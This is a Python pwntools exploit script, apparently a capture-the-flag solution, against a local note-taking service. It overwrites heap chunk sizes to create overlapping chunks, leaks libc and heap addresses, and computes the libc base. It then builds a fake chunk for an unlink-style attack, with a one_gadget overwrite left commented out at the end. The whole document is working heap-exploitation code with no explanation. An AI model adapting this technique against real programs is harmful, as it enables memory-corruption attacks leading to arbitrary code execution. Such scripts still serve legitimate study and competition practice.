#!/usr/bin/env python2

from pwn import *
from IPython import embed

context.arch = 'amd64'

e = ELF('./libc.so.6')
r = remote('127.0.0.1', 7122)

def menu():
	r.recvuntil('Your choice: \n')

def add(sz, nt):
	menu()
	r.send('1')
	r.recvuntil('size: \n')
	r.send(str(sz))
	r.recvuntil('note: \n')
	r.send(nt)

def dele(idx):
	menu()
	r.send('2')
	r.recvuntil('index: \n')
	r.send(str(idx))

def show(idx):
	menu()
	r.send('3')
	r.recvuntil('index: \n')
	r.send(str(idx))
	return r.recvuntil('=', drop=True)

def edit(idx, nt):
	menu()
	r.send('4')
	r.recvuntil('index: \n')
	r.send(str(idx))
	r.recvuntil('note: \n')
	r.send(nt)

size = []
for i in range(16):
	add(248, chr(i+0x41)*248)
edit(0, 'A'*248+flat(0xd01))
edit(0xd, 'J'*240+flat(0xd01))
dele(1)
dele(3)
dele(5)
dele(7)
dele(9)
dele(0xb)
add(248, '\x78')
x = show(1)
libc_heap = u64(x[-7:-1].ljust(8,'\0'))
print hex(libc_heap)
#r.interactive()
add(248, 'A'*9)
x = show(3)
heap_base = u64(('\x00'+x[-4:-1]).ljust(8, '\x00'))-0x700
print 'heap_base:', hex(heap_base)

#			    puts		heap
libc_heap_puts_off = 0x00007fbdc99d0690-0x00007fbdc9d25b78 
libc_puts = libc_heap+libc_heap_puts_off
print 'libc_puts:', hex(libc_puts)
libc_base = libc_puts-e.symbols['puts']
print 'libc_base:', hex(libc_base)

raw_input('@@')
#r.interactive()
curr_heap = heap_base+0x700
add(0xd00-8, 'a'*(0x600-8)+flat(0x101, curr_heap-0x18, curr_heap-0x10))
#add(0xd00-8, 'a'*0x600)
add(248, 'a')
r.interactive()
#one_gadget = 0xf1117
#add(248, flat(libc_base+one_gadget))

